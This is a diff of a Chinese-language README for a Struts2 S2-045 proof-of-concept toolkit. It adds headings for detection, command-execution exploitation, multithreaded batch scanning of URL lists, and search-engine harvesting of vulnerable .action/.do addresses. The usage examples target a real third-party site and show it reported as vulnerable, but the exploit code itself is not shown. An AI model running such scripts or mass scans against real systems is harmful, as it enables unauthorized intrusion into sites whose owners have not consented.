@@ -1,12 +1,13 @@
 ### USage
 
+#### 检测漏洞POC
 python s2_045.py http://job.10086.cn/company/anouncement/showAnouncement.action
 
 ```bash
 >python s2_045_cmd.py http://job.10086.cn/company/anouncement/showAnouncement.action
 [Loopholes exist] http://job.10086.cn/company/anouncement/showAnouncement.action
 ```
-
+#### 漏洞利用POC（cmd版）
 python s2_045_cmd.py http://job.10086.cn/company/anouncement/showAnouncement.action
 
 ```bash
@@ -67,12 +68,13 @@ startWebLogic.sh
 tmp
 
 ```
-
+#### 多线程批量检测脚本
 python S2_045_thread.py（填写url.txt后运行）
 
 ```bash
 填写url.txt文件，每行一个url地址(url中含.action/.do的地址)，运行完以后会生成一个result.txt文件存放存在漏洞的url
 ```
 
+#### 利用搜索引擎批量检测脚本
 想要采集网站中带.action/.do地址的，请看：[Search_S2_045](https://github.com/tengzhangchao/Struts2_045-Poc/tree/master/Search_S2_045)
 
